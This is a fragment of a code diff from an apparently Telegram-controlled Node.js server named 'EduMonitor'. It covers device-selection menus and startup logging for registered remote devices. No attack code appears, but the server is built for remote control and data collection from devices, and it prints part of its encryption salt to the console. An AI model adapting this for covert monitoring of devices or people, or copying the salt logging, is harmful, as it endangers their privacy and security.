-            await sendTelegramMessage(chatId, statsMsg);
-            break;
-        default:
-            if (data.startsWith('select_device:')) {
-                const selectedDeviceId = data.split(':')[1];
-                const device = devices.get(selectedDeviceId);
-                if (device) {
-                    userDeviceSelection.set(chatId, selectedDeviceId);
-                    await answerCallbackQuery(callbackId, `✅ Now controlling ${device.deviceInfo?.model}`);
-                    await editMessageKeyboard(chatId, messageId, getMainMenuKeyboard(chatId));
-                }
-            } else if (data === 'close_menu') {
-                await editMessageKeyboard(chatId, messageId, []);
-                await sendTelegramMessage(chatId, "Menu closed. Type /help to reopen.");
-            }
-            break;
-    }
-}
-
-function getDeviceSelectionKeyboard(chatId) {
-    const userDevices = getDeviceListForUser(chatId);
-    const keyboard = [];
-    userDevices.forEach(device => {
-        const status = device.isActive ? '✅ ' : '';
-        keyboard.push([{
-            text: `${status}${device.name}`,
-            callback_data: `select_device:${device.id}`
-        }]);
-    });
-    keyboard.push([{ text: '🔄 Refresh', callback_data: 'refresh_devices' }]);
-    keyboard.push([{ text: '📊 Stats', callback_data: 'device_stats' }]);
-    keyboard.push([{ text: '◀️ Back', callback_data: 'help_main' }]);
-    return keyboard;
-}
-
 // ============= START SERVER =============
 async function startServer() {
     console.log('🚀 Starting EduMonitor Server...');
@@ -1128,12 +1488,17 @@ async function startServer() {
         }
     }
     
+    // Load failover state
+    await loadFailoverState();
+    
     app.listen(PORT, '0.0.0.0', async () => {
         console.log(`\n🚀 Server running on port ${PORT}`);
         console.log(`📍 Server URL: ${activeServerUrl}`);
         console.log(`📱 Devices registered: ${devices.size}`);
         console.log(`👥 Authorized chats: ${authorizedChats.size}`);
         console.log(`🔐 Encryption salt: ${ENCRYPTION_SALT.substring(0, 10)}...`);
+        console.log(`🔄 Failover active: ${failoverState.isFailedOver ? 'YES' : 'NO'}`);
+        console.log(`📊 Auto-data queue: ${autoDataRequested.size} devices`);
         
         await setupWebhook();
     });
